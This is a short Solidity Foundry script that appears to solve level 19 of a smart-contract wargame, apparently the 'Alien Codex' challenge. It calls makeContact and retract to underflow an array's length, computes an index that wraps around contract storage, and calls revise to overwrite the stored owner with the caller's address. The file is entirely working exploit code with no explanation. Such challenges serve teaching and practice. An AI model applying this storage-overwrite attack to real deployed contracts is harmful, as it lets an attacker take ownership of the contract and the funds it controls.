// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Level19Script is Script {
    address addr = 0x33941FAF7d7FBdd265D2f5d7E2f587026675e0DC;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        (bool a,) = address(addr).call(abi.encodeWithSignature("makeContact()"));
        require(a);
        (bool b,) = address(addr).call(abi.encodeWithSignature("retract()"));
        require(b);
        uint256 index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 t = bytes32(uint256(uint160(msg.sender)));
        (bool c,) = address(addr).call(abi.encodeWithSignature("revise(uint256,bytes32)", index, t));
        require(c);
        vm.stopBroadcast();
    }
}
